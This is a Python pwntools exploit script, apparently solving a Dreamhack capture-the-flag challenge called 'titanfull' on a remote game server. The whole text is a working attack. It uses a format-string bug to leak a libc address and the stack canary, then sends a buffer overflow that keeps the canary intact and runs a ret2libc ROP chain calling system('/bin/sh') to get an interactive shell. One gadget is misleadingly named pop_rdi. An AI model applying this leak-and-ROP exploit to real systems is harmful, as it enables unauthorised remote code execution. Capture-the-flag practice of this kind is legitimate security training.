from pwn import *

#p = process('./titanfull')
p = remote('host8.dreamhack.games', 23705)

p.sendline(b'%21$p %17$p')

p.recvuntil(b'0x')
leak = int(p.recv(12), 16)
libc_base = leak - 0x23f90 - 243

pop_rdi = libc_base+0x0000000000023b6a+1

p.recvuntil(b'0x')
canary = int(p.recv(16), 16)

system_offset = 0x52290
system = libc_base + system_offset
binsh_offset = 0x1b45bd
binsh = libc_base + binsh_offset

print('system_offset :', hex(system_offset))
print('binsh_offset :', hex(binsh_offset))
print('canary :', hex(canary))
print('libc_base :', hex(libc_base))

p.sendline(b'7274')

payload = b'A'*24
payload += p64(canary)
payload += b'B'*8
payload += p64(libc_base+0x0000000000023b6a)
payload += p64(binsh)
payload += p64(pop_rdi)
payload += p64(system)

p.sendline(payload)

p.interactive()